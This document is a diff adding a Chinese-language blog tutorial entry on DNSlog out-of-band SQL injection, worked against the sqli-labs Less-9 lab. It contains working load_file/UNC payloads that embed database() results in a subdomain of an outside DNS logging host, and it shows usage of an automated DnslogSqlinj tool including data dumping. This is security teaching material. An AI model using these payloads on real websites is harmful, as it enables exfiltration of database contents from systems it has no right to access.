@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>SQL注入（9）：DNSlog注入</title>
+      <link href="/2023/04/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%889%EF%BC%89%EF%BC%9ADNSlog%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/04/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%889%EF%BC%89%EF%BC%9ADNSlog%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="dnslog注入">DNSlog注入</h2><p>DNSlog注入实际上是属于盲注的一种，但是比盲注效率高一点。</p><p>在一定的情况下，如果我们想对一个网站使用布尔或时间盲注，手动注入会对WAF的绕过会非常有帮助，但是效率不高，因此我们往往会使用SQLmap等工具注入，但是这种工具对很多网站都有限制。这时候就该尝试DNSlog注入。</p><p>这种注入方式，相较于布尔或时间盲注而言，好处在于可以一组一组进行测试，不用再一个一个字符进行逐以测试，比其他两个盲注效率要高，但是要求服务器的读写权限都要对MySQL开启，如果没有开启的话，是不能使用这种注入方式的。</p><h3 id="关键函数">关键函数</h3><ul><li><p><code>load_file(&quot;[路径]&quot;)</code>：用于读取某个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:\\test.txt&quot;);</span><br></pre></td></tr></table></figure><p>可以读取出文件，并且获取到一共多少个字节。</p><p>除了可以读取本机路径以外还可以读取到网络上的路径，即可以使用UNC路径。</p></li><li><p>UNC路径</p><p>格式：<code>\servername\sharename</code>，其中</p><ul><li>servername是服务器名，可以是域名或者是IP地址</li><li>sharename是共享资源的名称</li></ul><p>利用UNC路径能解析网络路径的特性</p></li></ul><h3 id="利用方式">利用方式</h3><p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304190011587.jpeg" alt="img"></p><p>而这里我们常常用到的DNSlog服务网站为</p><ul><li><p><a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p>使用方法：打开后，选择<code>get subdomain</code>获取一个dns服务器，接着我们尝试在浏览器打开随机一段字符串+获取到的dns服务器，例如<code>text.d3158r.dnslog.cn</code>，点击Refresh Record，即可获取到解析记录</p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304190027101.png" alt="image-20230419002710065" style="zoom:80%;" /></li><li><p><a href="https://dig.pm/">https://dig.pm/</a></p></li></ul><p>简而言之，注入过程就是让目标数据库去解析域名，然后在解析域名之前，执行一段查询语句，并加入到解析域名中，DNS记录下的解析记录即为查询结果。</p><h3 id="实例">实例</h3><p>由于dnslog.cn时不时无法访问，<a href="http://xn--dig-hb0er53olq7a23c.pm">这里使用dig.pm</a></p><p>我们还是继续用到Less-9。先判断出闭合方式为<code>'</code>，具体判断流程不再赘述。由于load_file函数中，参数是被双引号闭合起来的，因此我们需要用到concat来拼接字符串，不能直接在load_file中使用，以下是一个错误示范：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.181/sqli/less-9/?id=1&#x27; and (select load_file(//(select database()).f899e19f.ipv6.1433.eu.org/text.txt))) --+</span><br></pre></td></tr></table></figure><p>正确的注入语句构造方式应该是将<code>//</code>、查询的内容、和后面dns服务器的部分拼接起来，这样才能让查询的内容执行完，再放入load_file中执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.181/sqli/less-9/?id=1&#x27; and (select load_file(concat(&quot;//&quot;,(select database()),&quot;.f899e19f.ipv6.1433.eu.org/text.txt&quot;))) --+</span><br></pre></td></tr></table></figure><p>然后在dig.pm中获取解析记录</p><p><img src="https://icewindy-blog.oss-cn-shenzhen.aliyuncs.com/202304190057458.png" alt="image-20230419005719436"></p><p>发现已经有了结果。然后更具体的注入获取流程，请参考前面的笔记的过程，不再作出赘述。</p><h3 id="自动化注入利用">自动化注入利用</h3><p>DnslogSqlinj：<a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p><p>首先需要安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install gevent==1.2.2</span><br><span class="line">pip2 install termcolor</span><br></pre></td></tr></table></figure><p>然后我们需要修改配置文件，在ceye.io获取APItoken和DNSurl后，修改config.py中的APItoken和DNSurl。接着我们根据github上的提示即可自动化DNSlog注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -n TASKNAME, --name=TASKNAME</span><br><span class="line">                        task name</span><br><span class="line">  -t THREAD_COUNT, --thread=THREAD_COUNT</span><br><span class="line">                        thread_count</span><br><span class="line">  -u URL, --url=URL     target include injection</span><br><span class="line">  -i INF, --inf=INF     Testing target and Try to get information</span><br><span class="line">  --dbs                 get database</span><br><span class="line">  -D DB                 database name</span><br><span class="line">  --tables              get table</span><br><span class="line">  -T TABLE              table name</span><br><span class="line">  --columns             get column</span><br><span class="line">  -C COLUMN             column name</span><br><span class="line">  --dump                get data</span><br></pre></td></tr></table></figure><p>（ceye.io不清楚为什么进不去，能进去之后再进一步展示使用方法）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入（8）：sql注入文件上传</title>
       <link href="/2023/04/12/SQL%E6%B3%A8%E5%85%A5%EF%BC%888%EF%BC%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
       <url>/2023/04/12/SQL%E6%B3%A8%E5%85%A5%EF%BC%888%EF%BC%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
